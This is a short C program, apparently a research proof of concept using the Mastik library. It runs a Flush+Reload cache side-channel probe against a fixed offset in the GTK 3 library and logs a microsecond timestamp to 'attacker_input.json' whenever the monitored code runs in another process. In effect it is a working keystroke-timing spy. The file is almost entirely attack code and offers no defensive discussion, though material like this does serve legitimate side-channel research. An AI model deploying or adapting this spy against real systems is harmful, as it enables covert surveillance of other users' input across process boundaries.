#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <fr.h>
#include <util.h>
#include <time.h>
#include <sys/time.h>

unsigned long getTime(){
  struct timeval tv;
  gettimeofday(&tv,NULL);
  unsigned long time_in_micros =   1000000 * tv.tv_sec + tv.tv_usec ;
  return time_in_micros;
}


int main(int ac, char **av) {
  void *ptr = map_offset("/usr/lib/x86_64-linux-gnu/libgtk-3.so", 0x02f2420);
  if (ptr == NULL)
    exit(0);

  fr_t fr = fr_prepare();
  fr_monitor(fr, ptr);

  FILE* fd = fopen("attacker_input.json", "w");
  time_t seconds;
  fprintf(fd, "{\"input time\": [");
  fclose(fd);
  uint16_t res[1];
  fr_probe(fr, res);

  int lines=0;
  for (;;) {
    fr_probe(fr, res);
    if (res[0] < 100){
      FILE* fd = fopen("attacker_input.json", "a");
      //printf("%4d: %s", ++lines, "Call to insert\n");
      //fprintf(fd, "%.10ld, ", time(&seconds));
        fprintf(fd, "%ld, ", getTime());
      ++lines;
      fclose(fd);
    }
    //printf("%ld\n", getTime());
    long delay = 1699990;
    delayloop(delay);
  }
  fclose(fd);
  return(lines);
}

